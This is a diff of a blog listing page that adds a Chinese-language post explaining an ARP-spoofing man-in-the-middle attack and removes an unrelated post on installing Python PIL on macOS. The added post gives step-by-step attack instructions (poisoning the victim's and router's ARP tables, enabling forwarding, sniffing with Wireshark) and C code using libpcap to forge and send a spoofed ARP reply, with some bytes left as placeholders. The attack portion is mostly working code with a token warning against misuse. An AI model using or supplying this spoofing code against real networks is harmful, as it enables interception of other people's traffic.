@@ -107,6 +107,182 @@
           <!-- <ul class="listing"> -->
 
 <div class="page-header">
+  <h3><a href="/program/2013/03/20/arp%E6%AC%BA%E9%AA%97%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E3%80%81arp%E5%8C%85%E8%A7%A3%E6%9E%90">arp欺骗中间人攻击的实现、arp包解析 </a></h3>
+  <div class="date">
+    <span>20 March 2013</span>
+  </div>
+</div>
+
+<div class="row-fluid post-full">
+  <div class="span12">
+    <div class="content">
+      <p>首先先是了解下什么arp欺骗 可以参加这篇文章http://www.ahstu.edu.cn/wlzx/HTML/20090923173022.shtml<br />
+看完这篇文章我们就可以实施攻击<br />
+1.首先登陆自己的路由器 先对自己准备攻击的机器获得mac地址的信息（在真正攻击时需要用嗅探广发同个子网下的arp广播来获得mac地址）<br />
+2.对被攻击的mac地址绑定静态ip（这步在真正攻击时并不需要、我只是为了方便）<br />
+3.在路由器中进行绑定把被攻击者的ip的绑定到攻击者的mac地址（在真正攻击时对路由器发送欺骗的ARP欺骗响应在之后会说到）<br />
+4.对被攻击者发送arp欺骗应答使之网关的mac地址映射到攻击者的机器上或者简单的 arp -s attack's mac gateway就可以了<br />
+------------------ARP表的设置基本完成----------------------------------------------------------------------------<br />
+接下去需要打开自己网卡的路由功能（这个可以简单的打开共享网络来做到)<br />
+然后开个wireshark什么就安安静静的看着来回所有的数据全给抓到就可以了:P<br />
+------------------上面只是理想情况是你知道路由器密码别的情况你该怎么办？被攻击的人能老老实实给你用他电脑么?------------<br />
+接下去我们要分析下arp数据包<a href="http://snorlax-wordpress.stor.sinaapp.com/uploads/2013/03/54A4717D-5EB0-4B9A-9D84-10A71FC0A72C.jpg"><img src="http://snorlax-wordpress.stor.sinaapp.com/uploads/2013/03/54A4717D-5EB0-4B9A-9D84-10A71FC0A72C.jpg" alt="" title="54A4717D-5EB0-4B9A-9D84-10A71FC0A72C" width="680" height="232" class="alignnone size-full wp-image-299" /></a>
+然后我从真实抓下来的arp进行分析<br />
+首先arp广播包是 42个字节<br />
+arp响应包是60个字节(后面18个我实在没搞明白是什么……反正我乱填也是成功就是的了<br />
+然后我贴代码对这42个字节进行具体分析<br />
+因为socket的封装都在ip之上的……unp上查到的sock_packet我在mac上死活也没找到= =<br />
+不过我发现给在数据连路层上的更好的一组东西:)<br />
+神器不解释啊= =<br />
+详见<br />
+http://dog.tele.jp/winpcapeng/html/group__wpcap__fn.html</p>
+
+<p><p>
+```</p>
+
+<h1>include</h1>
+
+<h1>include</h1>
+
+<h1>include</h1>
+
+<p>int main(int argc, char **argv) {
+    pcap_t *fp;
+    char error[PCAP_ERRBUF_SIZE];
+    u_char packet[60];
+    int i;</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">/* Check the validity of the command line */
+if (argc != 2)
+{
+    printf(&quot;usage: %s inerface&quot;, argv[0]);
+    return -1;
+}
+
+/* Open the output adapter */
+if((fp = pcap_open_live(&quot;en0&quot;, 100, 1, 1000, error) ) == NULL)
+{
+    fprintf(stderr,&quot;\nError opening adapter: %s\n&quot;, error);
+    return -1;
+}
+
+/* Supposing to be on ethernet, set mac destination to 1:1:1:1:1:1 */
+/*被攻击者的mac*/
+packet[0]=xx;
+packet[1]=32;
+packet[2]=102;
+packet[3]=8;
+packet[4]=jiubu;
+packet[5]=gaosuni;
+
+/* set mac source to 2:2:2:2:2:2 */
+/*攻击者的mac*/
+packet[6]=jiu;
+packet[7]=bu;
+packet[8]=gaosu;
+packet[9]=234;
+packet[10]=xx;
+packet[11]=100;
+/*arp*/
+packet[12]=8;
+packet[13]=6;
+/*arp首部*/
+packet[14]=0;
+packet[15]=1;
+
+packet[16]=8;
+packet[17]=0;
+
+packet[18]=6;
+packet[19]=4;
+packet[20]=0;
+packet[21]=2;
+/*被骗的那个人的arp表上的假mac*/
+packet[22]=jiu;
+packet[23]=154;
+packet[24]=32;
+packet[25]=bu;
+packet[26]=253;
+packet[27]=gao;
+/*被骗者的网关*/
+packet[28]=192;
+packet[29]=168;
+packet[30]=1;
+packet[31]=1;
+/*被攻击者的mac*/
+packet[32]=xx;
+packet[33]=32;
+packet[34]=102;
+packet[35]=xx;
+packet[36]=xx;
+packet[37]=184;
+/*被攻击者的ip*/
+packet[38]=192;
+packet[39]=168;
+packet[40]=1;
+packet[41]=114;
+
+/* Fill the rest of the packet */
+/*乱填就好了*/
+for(i=42;i
+    packet[i]=i%256;
+}
+
+/* Send down the packet */
+pcap_sendpacket(fp,
+                packet,
+                60);
+
+return 0;
+</code></pre></div>
+<p>}</p>
+
+<p>以上arp欺骗的完整实现、不要用来干坏事= =</p>
+
+<blockquote>
+</blockquote>
+
+    </div>
+
+  
+    <ul class="tag_box inline">
+      <li><i class="icon-folder-open"></i></li>
+      
+      
+
+
+  
+    
+    	<li><a href="#program-ref">
+    		program <span>44</span>
+    	</a></li>
+    
+  
+
+
+
+    </ul>
+  
+
+  
+    <ul class="tag_box inline">
+      <li><i class="icon-tags"></i></li>
+      
+      
+
+
+  
+    
+  
+
+
+
+    </ul>
+  
+  </div>
+</div>
+
+
+<div class="page-header">
   <h3><a href="/program/2013/03/15/sae-%E6%99%AE%E9%80%9A%E5%BC%80%E5%8F%91%E8%80%85%E5%85%8D%E6%8E%A8%E8%8D%90%E8%AE%A4%E8%AF%81%E6%B4%BB%E5%8A%A83-15-%E8%A7%A3">sae 普通开发者免推荐认证活动3.15 解 </a></h3>
   <div class="date">
     <span>15 March 2013</span>
@@ -163,7 +339,7 @@ print l</p>
   
     
     	<li><a href="#program-ref">
-    		program <span>43</span>
+    		program <span>44</span>
     	</a></li>
     
   
@@ -237,7 +413,7 @@ url_short,$account['content']);
   
     
     	<li><a href="#program-ref">
-    		program <span>43</span>
+    		program <span>44</span>
     	</a></li>
     
   
@@ -316,7 +492,7 @@ ps.以上的server的环境是在2.1.3的基础上server我放了个压缩包ser
   
     
     	<li><a href="#program-ref">
-    		program <span>43</span>
+    		program <span>44</span>
     	</a></li>
     
   
@@ -387,7 +563,7 @@ ps.以上的server的环境是在2.1.3的基础上server我放了个压缩包ser
   
     
     	<li><a href="#program-ref">
-    		program <span>43</span>
+    		program <span>44</span>
     	</a></li>
     
   
@@ -455,7 +631,7 @@ opener = urllib2.build_opener(NoExceptionCookieProcesser(cookie))
   
     
     	<li><a href="#program-ref">
-    		program <span>43</span>
+    		program <span>44</span>
     	</a></li>
     
   
@@ -553,7 +729,7 @@ opener = urllib2.build_opener(NoExceptionCookieProcesser(cookie))
   
     
     	<li><a href="#program-ref">
-    		program <span>43</span>
+    		program <span>44</span>
     	</a></li>
     
   
@@ -731,7 +907,7 @@ ps.最后记得注意要修改脚本的权限……chown root:wheel chmod 755
   
     
     	<li><a href="#program-ref">
-    		program <span>43</span>
+    		program <span>44</span>
     	</a></li>
     
   
@@ -816,108 +992,7 @@ def diffCount(h1,h2):
   
     
     	<li><a href="#program-ref">
-    		program <span>43</span>
-    	</a></li>
-    
-  
-
-
-
-    </ul>
-  
-
-  
-    <ul class="tag_box inline">
-      <li><i class="icon-tags"></i></li>
-      
-      
-
-
-  
-    
-  
-
-
-
-    </ul>
-  
-  </div>
-</div>
-
-
-<div class="page-header">
-  <h3><a href="/program/2012/12/07/%E5%85%B3%E4%BA%8Epython%E5%9B%BE%E5%BD%A2%E5%BA%93pil%E5%9C%A8mac-os%E4%B8%8B%E7%9A%84%E5%AE%89%E8%A3%85">关于python图形库pil在mac os下的安装 </a></h3>
-  <div class="date">
-    <span>07 December 2012</span>
-  </div>
-</div>
-
-<div class="row-fluid post-full">
-  <div class="span12">
-    <div class="content">
-      <p>首先在mac os的环境下根据官方给出的release版本
-<a href="http://effbot.org/downloads/Imaging-1.1.7.tar.gz" title="Python Imaging Library 1.1.7 Source Kit ">Python Imaging Library 1.1.7 Source Kit</a> <br />
-如果在debian下可以非常简便的就<br />
-sudo apt-get install libjpeg62-dev<br />
-sudo apt-get install zlib1g-dev<br />
-sudo apt-get install libfreetype6-dev<br />
-sudo apt-get install liblcms1-dev<br />
-然后就 python setup.py install 轻松又愉快<br />
-可是mac的说明我有点蒙</p>
-
-<p>--------------------------------------------------------------------<br />
-Additional notes for Mac OS X<br />
---------------------------------------------------------------------</p>
-
-<p>On Mac OS X you will usually install additional software such as<br />
-libjpeg or freetype with the "fink" tool, and then it ends up in<br />
-"/sw".  If you have installed the libraries elsewhere, you may have<br />
-to tweak the "setup.py" file before building.</p>
-
-<p>反正我一开始也就理所当然的当成usually install additional software的一份子了、当然结果肯定是残忍的<br />
-pil是可以用但是任何的解析基本都会报类似<br />
-raise IOError decoder s not available decoder_name IOError decoder jpeg not available的错</p>
-
-<p>google了无数各种做ln连来连去的……<br />
-注意一点就是 3一下的版本都在 /System/Library/Frameworks/Python.framework/Versions/下<br />
-3以上的版本都在 /Library/Frameworks/Python.framework/Versions<br />
-然后site-package<br />
-分别在<br />
-/Library/Python/2.7/site-packages<br />
-/Library/Python/2.3/site-packages<br />
-/usr/local/git/lib/python2.7/site-packages<br />
-/Library/Python/2.5/site-packages<br />
-/Library/Python/2.6/site-packages<br />
-/Library/Frameworks/Python.framework/Versions/3.2/lib/python3.2/site-packages<br />
-/usr/local/lib/python3.2/site-packages<br />
-混乱了吧……记得你装的是哪儿个版本、然后在configure之前要都设置对路径……私认为这绝对是太残忍了……<br />
------------------------------------分割线--------------------------------------<br />
-下面是经过实践出的最简单的方法、就用python自带的easy_install里的pip这样默认都帮你configure完了也不用你纠结了<br />
-就这么几句就搞定了<br />
-sudo easy_install pip<br />
-sudo brew install jpeg<br />
-sudo brew install libjpeg<br />
-sudo pip uninstall pil<br />
-sudo pip install pil</p>
-
-<p>搞定记得顺序、先要装依赖</p>
-
-<p>附上PIL的文档:<br />
-http://www.pythonware.com/library/pil/handbook/index.htm</p>
-
-    </div>
-
-  
-    <ul class="tag_box inline">
-      <li><i class="icon-folder-open"></i></li>
-      
-      
-
-
-  
-    
-    	<li><a href="#program-ref">
-    		program <span>43</span>
+    		program <span>44</span>
     	</a></li>
     
   
@@ -985,7 +1060,7 @@ http://www.pythonware.com/library/pil/handbook/index.htm</p>
   
     <a class="next" href="/page4">后页</a>
   
-  (共55篇)
+  (共56篇)
 </div>
 
         </div>
